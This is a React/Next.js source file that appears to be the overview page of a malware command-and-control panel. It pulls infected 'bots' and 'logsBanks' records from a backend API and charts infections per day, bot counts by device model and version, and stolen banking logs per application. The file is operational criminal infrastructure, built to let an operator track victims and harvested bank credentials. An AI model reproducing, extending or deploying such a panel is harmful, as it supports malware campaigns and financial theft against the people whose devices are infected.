import Head from 'next/head';
import { subDays, subHours } from 'date-fns';
import { Box, Button, Card, Container, Link, Typography, Unstable_Grid2 as Grid } from '@mui/material';
import { Layout as DashboardLayout } from 'src/layouts/dashboard/layout';
import { OverviewBudget } from 'src/sections/overview/overview-budget';
import { OverviewLatestOrders } from 'src/sections/overview/overview-latest-orders';
import { OverviewLatestProducts } from 'src/sections/overview/overview-latest-products';
import { OverviewSales } from 'src/sections/overview/overview-sales';
import { OverviewTasksProgress } from 'src/sections/overview/overview-tasks-progress';
import { OverviewTotalCustomers } from 'src/sections/overview/overview-total-customers';
import { OverviewTotalProfit } from 'src/sections/overview/overview-total-profit';
import { OverviewTraffic } from 'src/sections/overview/overview-traffic';
import { OverviewLogs } from 'src/sections/overview/overview-logs';
import { checkperms } from 'src/utils/checkperms';


import { useEffect, useState } from 'react';
import $ from 'jquery';
import SettingsContext from '../settings';
import { Stack } from '@mui/system';
import { faArrowLeft } from '@fortawesome/free-solid-svg-icons';
import { FontAwesomeIcon } from '@fortawesome/react-fontawesome';
import HorizontalBarChart from 'src/sections/overview/model-chart';
const now = new Date();

const Page = () => {
  const [GeneralData, setGeneralData] = useState([])
  const [FinalversionCounts, setFinalversionCounts] = useState([])
  const [FinalLogsCounts, setFinalLogsCounts] = useState([])
  const [Infections, setInfections] = useState([])

  const [Models, setModels] = useState([])
  const [ModelCounts, setModelCounts] = useState([])


  useEffect(() => {
    if(!checkperms(3)) {
      return
    }

  async function MainStats() {
    let request = $.ajax({
      type: 'POST',
      url: SettingsContext.restApiUrl,
      data: {
          'params':  new Buffer ('{"request":"mainStats","tag":"' + SettingsContext.user.tag + '","password":"' + SettingsContext.password + ' "}').toString('base64')
      }
    });
        
    request.done(function(msg) {
      let response = (JSON.parse(msg))
    
      setGeneralData(response)
    
      
    }.bind(this));
    
  }

  async function Bots() {
    let request = $.ajax({
      type: 'POST',
      url: SettingsContext.restApiUrl,
      data: {
          'params':  new Buffer ('{"request":"getBots","currentPage":"1","sorting":"0000000000","botsperpage":"100000","countrycode":"","findbyid":"","password":"' + SettingsContext.password + ' "}').toString('base64')
      }
    });
        
    request.done(function(msg) {
      let response = (JSON.parse(msg))
    
      let bots = response.bots

      let versionCounts = {}
      let ModelCounts = {}

      for (const bot of bots) {
        if (bot.tag === SettingsContext.user.tag || SettingsContext.user.tag === "ALL") {
          let version = bot.version;
          let model = bot.model;
  
          if (!ModelCounts[model]) {
            ModelCounts[model] = 1;
          } else {
            ModelCounts[model]++;
          }
  
          version = version.split(".")[0];
          if (!versionCounts[version]) {
              versionCounts[version] = 1;
          } else {
              versionCounts[version]++;
          }
        }

      }

      setFinalversionCounts(versionCounts)
      setModelCounts(ModelCounts)
      console.log(ModelCounts)
      
      function countDates(data) {
        const startDate = new Date(Math.min(...data.map((item) => new Date(item.dateInfection))));
        const endDate = new Date();
        const numDays = Math.ceil((endDate - startDate) / (1000 * 60 * 60 * 24));
      
        const datesObject = {};
        data.forEach((item) => {
          if (item.tag === SettingsContext.user.tag || SettingsContext.user.tag === "ALL") {
          const date = new Date(item.dateInfection.split(" ")[0]);
          const dateStr = date.toISOString().split("T")[0];
          if (!datesObject[dateStr]) {
            datesObject[dateStr] = 0;
          }
          datesObject[dateStr] += 1;
        }
        });
      
        const resultObject = {};
        const currentDate = new Date(startDate);
        for (let i = 0; i < numDays; i++) {
          const dateStr = currentDate.toISOString().split("T")[0];
          resultObject[dateStr] = datesObject[dateStr] || 0;
          currentDate.setDate(currentDate.getDate() + 1);
        }
      
        return resultObject;
      }
      

      

      setInfections(countDates(bots))
      
    }.bind(this));
    
  }


  async function Logs() {
    let request = $.ajax({
      type: 'POST',
      url: SettingsContext.restApiUrl,
      data: {
          'params':  new Buffer ('{"request":"getLogsBank","password":"' + SettingsContext.password + ' "}').toString('base64')
      }
    });
        
    request.done(function(msg) {
      let response = (JSON.parse(msg))
    
      let logs = response.logsBanks;


      let logsCounts = {}

      for (const log of logs) {
        let app = log.application;

        if (!logsCounts[app]) {
            logsCounts[app] = 1;
        } else {
            logsCounts[app]++;
        }

      }

      setFinalLogsCounts(logsCounts);
    });
  }

  MainStats()
  Bots()
  Logs()

  }, []);
  if (!checkperms(3)){
    return (
      <>
          <Head>
            <title>
              Overview
            </title>
          </Head>
          <Box
            component="main"
            sx={{
              flexGrow: 1,
              py: 8
            }}
          >
            <Container maxWidth="xl">
              <Stack spacing={3}>
                <div>
                <Link href="/bots" style={{ textDecoration: 'none' }}>
                    <Button
                      startIcon={(
                        <FontAwesomeIcon icon={faArrowLeft} />
                      )}
                      variant="contained"
                    >
                      Back
                    </Button>
                </Link>
                </div>
                <center><Typography fontSize={32}>You arent allowed here</Typography></center>
                </Stack>
                </Container>
          </Box>
      </>
    )
  }


  return (
  <>
    <Head>
      <title>
        Overview
      </title>
    </Head>
    <Box
      component="main"
      sx={{
        flexGrow: 1,
        py: 8
      }}
    >
      <Container maxWidth="xl">
        <Grid
          container
          spacing={3}
        >
          <Grid
            xs={12}
            sm={6}
            lg={3}
          >
            <OverviewBudget
              difference={12}
              positive
              sx={{ height: '100%' }}
              value={GeneralData.banks}
            />
          </Grid>
          <Grid
            xs={12}
            sm={6}
            lg={3}
          >
            <OverviewTotalCustomers
              difference={16}
              positive={false}
              sx={{ height: '100%' }}
              value={GeneralData.bots ? GeneralData.bots : ""}
            />
          </Grid>
          <Grid
            xs={12}
            sm={6}
            lg={3}
          >
            <OverviewTotalProfit
              sx={{ height: '100%' }}
              value={GeneralData.online}
            />
          </Grid>
          <Grid
            xs={12}
            sm={6}
            lg={3}
          >
            <OverviewTasksProgress
              sx={{ height: '100%' }}
            />
          </Grid>
          <Grid
            xs={12}
            lg={8}
          >
            <OverviewSales
                  data={Object.values(Infections)}
                  labels={Object.keys(Infections)}
            />
          </Grid>
          <Grid
            xs={12}
            md={6}
            lg={4}
          >
            <OverviewTraffic
              chartSeries={Object.values(FinalversionCounts)}
              labels={Object.keys(FinalversionCounts)}
              sx={{ height: '100%' }}
            />
          </Grid>
          <Grid
            xs={12}
            md={6}
            lg={4}
          >
            <OverviewLogs
              chartSeries={Object.values(FinalLogsCounts)}
              labels={Object.keys(FinalLogsCounts)}
              sx={{ height: '100%' }}
            />
          </Grid>
          <Grid
            xs={12}
            lg={8}
          >
            <HorizontalBarChart
            labels={Object.keys(ModelCounts)}
            vals={Object.values(ModelCounts)}
            />
          </Grid>
        </Grid>
      </Container>
    </Box>
  </>
);
}

Page.getLayout = (page) => (
  <DashboardLayout>
    {page}
  </DashboardLayout>
);

export default Page;
